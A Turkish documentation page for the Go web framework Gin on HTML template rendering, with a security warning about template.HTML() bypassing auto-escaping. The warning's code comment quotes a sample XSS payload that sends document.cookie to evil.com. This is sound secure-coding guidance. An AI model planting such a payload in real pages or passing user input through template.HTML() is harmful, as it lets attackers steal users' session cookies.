---
title: "HTML işleme"
sidebar:
  order: 9
---

Gin, HTML işleme için [html/template](https://pkg.go.dev/html/template) paketini kullanır.
Mevcut yer tutucular dahil olmak üzere bunların nasıl kullanılacağı hakkında daha fazla bilgi için [text/template](https://pkg.go.dev/text/template) belgelerine bakın.

Yüklenecek HTML dosyalarını seçmek için LoadHTMLGlob() veya LoadHTMLFiles() kullanın.

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/*")
  //router.LoadHTMLFiles("templates/template1.html", "templates/template2.html")
  router.GET("/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{
      "title": "Main website",
    })
  })
  router.Run(":8080")
}
```

templates/index.tmpl

```html
<html>
  <h1>
    {{ .title }}
  </h1>
</html>
```

Farklı dizinlerde aynı adlı şablonlar kullanma

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/**/*")
  router.GET("/posts/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "posts/index.tmpl", gin.H{
      "title": "Posts",
    })
  })
  router.GET("/users/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "users/index.tmpl", gin.H{
      "title": "Users",
    })
  })
  router.Run(":8080")
}
```

**Not:** Lütfen HTML şablonunuzu `{{define <template-path>}} {{end}}` bloğuyla sarmalayın ve şablon dosyanızı göreceli yol `<template-path>` ile tanımlayın. Aksi takdirde GIN şablon dosyalarını doğru şekilde ayrıştıramaz.

templates/posts/index.tmpl

```html
{{ define "posts/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using posts/index.tmpl</p>
</html>
{{ end }}
```

templates/users/index.tmpl

```html
{{ define "users/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using users/index.tmpl</p>
</html>
{{ end }}
```

### http.FileSystem'dan şablon yükleme (v1.11+)

Şablonlarınız gömülüyse veya bir `http.FileSystem` tarafından sağlanıyorsa `LoadHTMLFS` kullanın:

```go
import (
  "embed"
  "io/fs"
  "net/http"
  "github.com/gin-gonic/gin"
)

//go:embed templates
var tmplFS embed.FS

func main() {
  r := gin.Default()
  sub, _ := fs.Sub(tmplFS, "templates")
  r.LoadHTMLFS(http.FS(sub), "**/*.tmpl")
  r.GET("/", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{"title": "From FS"})
  })
  r.Run(":8080")
}
```

### Güvenlik uyarısı: `template.HTML()` otomatik kaçışlamayı atlar

Go'nun `html/template` paketi, XSS'i (Cross-Site Scripting) önlemek için şablonlara eklenen değerleri otomatik olarak kaçışlar. Ancak bir dizeyi `template.HTML()` türüne dönüştürdüğünüzde, bu korumayı açıkça atlarsınız. Dize kullanıcı tarafından sağlanan girdi içeriyorsa, bir saldırgan rastgele JavaScript enjekte edebilir.

**Güvensiz -- kullanıcı girdisiyle asla `template.HTML()` kullanmayın:**

```go
// DANGEROUS: attacker controls userInput, which could be:
// <script>document.location='https://evil.com/?cookie='+document.cookie</script>
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": template.HTML(userInput), // XSS vulnerability!
})
```

**Güvenli -- şablon motorunun kullanıcı girdisini otomatik olarak kaçışlamasına izin verin:**

```go
// SAFE: html/template will escape any HTML/JS in userInput
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": userInput, // auto-escaped by html/template
})
```

`template.HTML()`'i yalnızca kendi kodunuzda tanımlanan statik HTML parçacıkları gibi tamamen kontrol ettiğiniz içerikler için kullanın. Kullanıcı girdisinden, kullanıcılar tarafından doldurulan veritabanı alanlarından veya herhangi bir güvenilmeyen kaynaktan gelen değerlerle asla kullanmayın.

### Özel Şablon işleyicisi

Kendi html şablon işleyicinizi de kullanabilirsiniz

```go
import "html/template"

func main() {
  router := gin.Default()
  html := template.Must(template.ParseFiles("file1", "file2"))
  router.SetHTMLTemplate(html)
  router.Run(":8080")
}
```

### Özel Sınırlayıcılar

Özel sınırlayıcılar kullanabilirsiniz

```go
  router := gin.Default()
  router.Delims("{[{", "}]}")
  router.LoadHTMLGlob("/path/to/templates")
```

### Özel Şablon Fonksiyonları

Ayrıntılı [örnek koda](https://github.com/gin-gonic/examples/tree/master/template) bakın.

main.go

```go
import (
    "fmt"
    "html/template"
    "net/http"
    "time"

    "github.com/gin-gonic/gin"
)

func formatAsDate(t time.Time) string {
    year, month, day := t.Date()
    return fmt.Sprintf("%d/%02d/%02d", year, month, day)
}

func main() {
    router := gin.Default()
    router.Delims("{[{", "}]}")
    router.SetFuncMap(template.FuncMap{
        "formatAsDate": formatAsDate,
    })
    router.LoadHTMLFiles("./testdata/template/raw.tmpl")

    router.GET("/raw", func(c *gin.Context) {
        c.HTML(http.StatusOK, "raw.tmpl", map[string]interface{}{
            "now": time.Date(2017, 07, 01, 0, 0, 0, 0, time.UTC),
        })
    })

    router.Run(":8080")
}

```

raw.tmpl

```sh
Date: {[{.now | formatAsDate}]}
```

Sonuç:

```sh
Date: 2017/07/01
```
